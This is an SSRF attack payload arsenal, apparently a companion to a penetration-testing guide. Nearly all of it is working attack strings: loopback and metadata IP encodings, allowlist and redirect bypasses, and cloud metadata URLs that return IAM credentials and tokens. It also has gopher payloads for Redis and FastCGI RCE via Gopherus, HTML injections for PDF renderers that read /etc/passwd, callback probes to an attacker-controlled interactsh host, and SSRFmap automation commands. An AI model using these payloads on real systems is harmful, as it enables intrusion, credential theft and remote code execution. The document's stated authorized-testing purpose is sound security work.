# SSRF Attack Arsenal — IP Encodings, Metadata URLs, Bypasses & gopher Payloads

> Companion to `SSRF_TESTING_GUIDE.md`. **Baseline first** (guide §4: server source IP, observability class), then **reach inward** (guide §5). Replace `YOUR.oast.fun` with your Collaborator/interactsh host and `YOUR-HOST` with your redirect server. Authorized targets only; prove creds with `sts get-caller-identity` and stop (guide §23).

---

## A. Baseline / confirm (guide §4)
```
url=http://YOUR.oast.fun/baseline           # watch interactsh: SOURCE IP = server? = SSRF
url=http://YOUR.oast.fun:80/                 # HTTP hit
url=//YOUR.oast.fun/                          # scheme-relative
# also inject into headers on EVERY request:
X-Forwarded-For: YOUR.oast.fun
Referer: http://YOUR.oast.fun/
X-Forwarded-Host: YOUR.oast.fun
True-Client-IP: YOUR.oast.fun
```

## B. Reachability probes (guide §5)
```
http://127.0.0.1/         http://localhost/        http://0.0.0.0/        http://[::1]/
http://127.0.0.1:6379/    http://127.0.0.1:9200/   http://127.0.0.1:8080/  http://127.0.0.1:2375/
http://169.254.169.254/   http://metadata.google.internal/
http://10.0.0.1/  http://172.17.0.1/  http://192.168.0.1/         # internal ranges + docker gw
file:///etc/hostname
```

## C. IP & host obfuscation — 127.0.0.1 (guide §6)
```
2130706433                 decimal
0x7f000001  0x7f.0x0.0x0.0x1   hex
0177.0.0.1  0177.0.0.01       octal
127.1  127.0.1               short
[::1]  [0:0:0:0:0:0:0:1]      IPv6 loopback
[::ffff:127.0.0.1]  [::ffff:7f00:1]   IPv4-mapped IPv6
127.0.0.1.nip.io  localtest.me  127.0.0.1.sslip.io   wildcard DNS
①②⑦.0.0.1 / 127。0。0。1       unicode/ideographic (parser confusion)
```

## D. IP & host obfuscation — 169.254.169.254 metadata (guide §6/§11)
```
2852039166                 decimal
0xa9fea9fe  0xA9.0xFE.0xA9.0xFE   hex
0251.0376.0251.0376        octal
[::ffff:169.254.169.254]  [::ffff:a9fe:a9fe]   IPv6-mapped
169.254.169.254.           trailing dot
169.254.169.254.nip.io     wildcard DNS
http://169.254.169.254%2f%2e%2e%2f...   path tricks
http://1ynrnhl.oast.fun → (your DNS A record) → 169.254.169.254   custom DNS / rebinding
```

## E. Allowlist / parser-confusion bypasses (guide §9)
```
http://allowed.com@169.254.169.254/
http://169.254.169.254#@allowed.com/        http://169.254.169.254#.allowed.com
http://169.254.169.254%23.allowed.com
http://allowed.com\@169.254.169.254/        http://169.254.169.254\.allowed.com
http://allowed.com.169.254.169.254.nip.io/
http://169.254.169.254.allowed.com/         (if *.allowed.com is attacker-controlled / suffix check)
http://allowed.com.evil.com/                (weak "contains allowed.com")
http://evil-allowed.com/                    (weak substring)
http://allowed.com:80@169.254.169.254:80/
http://169.254.169.254%0d%0a@allowed.com    CRLF
http://[::ffff:169.254.169.254]@allowed.com
http://169.254.169.254%09allowed.com  /  %20 / %2e
double-encode: %25%36%39 ... (validator decodes once, client twice)
```

## F. Redirect-based bypass (guide §8)
```
# Host on YOUR-HOST (poc/redirect_server.py):
http://YOUR-HOST/r   →  302 Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Open redirect on the target's OWN domain (passes same-origin checks):
https://allowed.com/redirect?url=http://169.254.169.254/latest/meta-data/
https://allowed.com/out?to=http://127.0.0.1:6379/
# Chain multiple hops to defeat "final==initial host" checks.
```

## G. Protocols (guide §10)
```
file:///etc/passwd   file:///proc/self/environ   file:///etc/hostname   file:///C:/Windows/win.ini
dict://127.0.0.1:6379/INFO     dict://127.0.0.1:11211/stats
gopher://127.0.0.1:6379/_<redis-bytes>     gopher://127.0.0.1:9000/_<fastcgi>   (see section J)
ftp://127.0.0.1/   ldap://127.0.0.1/
# test acceptance: url=gopher://YOUR.oast.fun:80/_TEST  → raw bytes arrive at your nc listener = gopher live
```

## H. Cloud metadata endpoints (guide §11)
```
# AWS (IMDSv1 — no header):
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE>      ← creds
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/dynamic/instance-identity/document             ← account/region
# AWS IMDSv2 (needs token via PUT — use gopher/header control):
#   PUT /latest/api/token  with  X-aws-ec2-metadata-token-ttl-seconds: 21600
#   then GET with header  X-aws-ec2-metadata-token: <token>

# GCP (header: Metadata-Flavor: Google):
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token   ← token
http://metadata.google.internal/computeMetadata/v1/instance/attributes/
http://169.254.169.254/computeMetadata/v1/...

# Azure (header: Metadata: true):
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

# DigitalOcean:  http://169.254.169.254/metadata/v1/
# Oracle OCI (header: Authorization: Bearer Oracle): http://169.254.169.254/opc/v2/instance/
# Alibaba:       http://100.100.100.200/latest/meta-data/
# Kubernetes:    file:///var/run/secrets/kubernetes.io/serviceaccount/token  ·  :10250 kubelet · :6443 API · :2379 etcd
```

## I. Internal port scan targets (guide §12)
```
22 SSH · 25/587 SMTP · 80/443 web · 2375 Docker · 3306 MySQL · 5432 Postgres · 5601 Kibana
6379 Redis · 8080/8443 internal apps · 8500 Consul · 9000 Sonar/Portainer · 9200/9300 Elasticsearch
10250 Kubelet · 6443 k8s API · 11211 Memcached · 15672 RabbitMQ · 27017 Mongo · 5000 registry
# in-band reads worth trying:
http://127.0.0.1:9200/_cat/indices    http://127.0.0.1:8080/actuator/env    http://127.0.0.1:8500/v1/kv/?recurse
```

## J. gopher → internal service (guide §13)  — use Gopherus / poc/gopher_redis.py
```
# Redis (BENIGN proof first): SET a marker, then read it / INFO
gopher://127.0.0.1:6379/_%2A1%0d%0a%244%0d%0aINFO%0d%0a
# Gopherus builds full payloads (URL-encoded) for:
python3 Gopherus/gopherus.py --exploit redis      # cron / SSH key / webshell (authorized + cleanup only)
python3 Gopherus/gopherus.py --exploit fastcgi    # PHP-FPM :9000 RCE
python3 Gopherus/gopherus.py --exploit mysql
python3 Gopherus/gopherus.py --exploit smtp
# our benign builder:
python3 poc/gopher_redis.py --host 127.0.0.1 --port 6379 --benign     # SET ssrf-poc marker + INFO
```

## K. PDF / headless / image-render SSRF (guide §16)
```html
<iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/"></iframe>
<img src="file:///etc/passwd">
<img src="http://127.0.0.1:6379/">
<script>fetch('http://169.254.169.254/latest/meta-data/').then(r=>r.text()).then(t=>document.write(t))</script>
<link rel=attachment href="file:///etc/passwd">     <!-- wkhtmltopdf -->
<annotation file="/etc/passwd"></annotation>
```

## L. Automation (guide §25)
```bash
# Burp "Collaborator Everywhere" (passive header injection) — finds hidden SSRF.
cat urls.txt | qsreplace 'http://YOUR.oast.fun' | httpx -silent    # then watch interactsh
nuclei -l live.txt -tags ssrf
python3 SSRFmap/ssrfmap.py -r req.txt -p url -m readfiles,portscan,redis,aws,gce
python3 poc/ssrf_probe.sh https://target/fetch url YOUR.oast.fun   # fires the metadata/internal/bypass matrix
```

## M. AWS ECS / Lambda / EKS container credentials (guide §11) — often missed, high-value
```
# ECS/Fargate task role creds (relative URI in env AWS_CONTAINER_CREDENTIALS_RELATIVE_URI):
http://169.254.170.2/v2/credentials/<GUID>
http://169.254.170.2${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}
# (full URI variant) http://169.254.170.2/v2/credentials/  → lists, then fetch the GUID
# Lambda (env-based, reach via file:// or RCE): AWS_ACCESS_KEY_ID / _SECRET / _SESSION_TOKEN in /proc/self/environ
# EKS/IRSA: web-identity token at file:///var/run/secrets/eks.amazonaws.com/serviceaccount/token
# IMDSv2 walk (needs header control / gopher to send the PUT then the GET):
#   PUT http://169.254.169.254/latest/api/token  (X-aws-ec2-metadata-token-ttl-seconds: 21600)
#   GET .../iam/security-credentials/<ROLE>  with  X-aws-ec2-metadata-token: <token>
# GCP recursive (one request dumps everything): .../computeMetadata/v1/?recursive=true&alt=json  (Metadata-Flavor: Google)
# Azure managed identity for a specific resource: .../metadata/identity/oauth2/token?...&resource=https://vault.azure.net
```

## N. DNS rebinding & advanced reach tooling (guide §7)
```
# Services that flip a name from a public IP (validation) to an internal IP (fetch):
make-it-rebind / rbndr (taviso):  <pubhex>.<internalhex>.rbndr.us       e.g. 7f000001.<x>.rbndr.us
1u.ms:                            <ip1>.<ip2>.1u.ms  /  make-<ip>.1u.ms
Singularity of Origin (NCC):      self-host a rebinding attack server for TOCTOU allowlist bypass
nip.io / sslip.io / localtest.me: static wildcard → embedded IP (passes "must be a domain")
# When the app does resolve→check-public→fetch as TWO lookups, rebinding wins (guide §7.2).
```

## O. Real-world SSRF CVEs & bug-bounty chains (guide §11/§16)
```
□ Capital One (2019) — WAF SSRF → IMDSv1 → IAM role creds → S3 dump (the canonical SSRF→cloud-takeover).
□ GitLab CVE-2021-22214 — unauth SSRF via CI lint / project import (URL fetch) → internal/metadata.
□ Jira CVE-2019-8451 — /plugins/servlet/gadgets/makeRequest SSRF (allowlist @-bypass).
□ Confluence / ColdFusion / Grafana (CVE-2020-13379 avatar proxy) — image/URL proxies → SSRF.
□ WordPress xmlrpc pingback / oEmbed proxy — classic blind SSRF surface.
□ PDF/HTML renderers (wkhtmltopdf, headless Chrome, Prince), ImageMagick url/https delegate, FFmpeg HLS —
   processing-driven SSRF → metadata (cross-ref FileUpload kit §16 / §P).
□ Webhook / "import from URL" / link-preview / avatar-by-URL — the everyday SSRF entry points (guide §3).
□ Open-redirect-on-allowed-host → SSRF allowlist bypass (§F) — extremely common chain.
```
> **References:** PortSwigger *SSRF* (Web Security Academy + labs + "Cracking the lens"), OWASP SSRF Prevention Cheat
> Sheet, PayloadsAllTheThings *Server Side Request Forgery*, HackTricks *SSRF*, Hackviser & PentesterLab SSRF modules,
> SSRFmap / Gopherus, the Capital One post-mortem.

---

> Which payload to use is decided by **baseline + reachability** (guide §4/§5) and the **decision tree** (Appendix B). A finding is real only when the server **reaches internal/metadata and you obtain creds/data/RCE/file** (guide §19/§20). Prove creds with `aws sts get-caller-identity` and stop (guide §23).
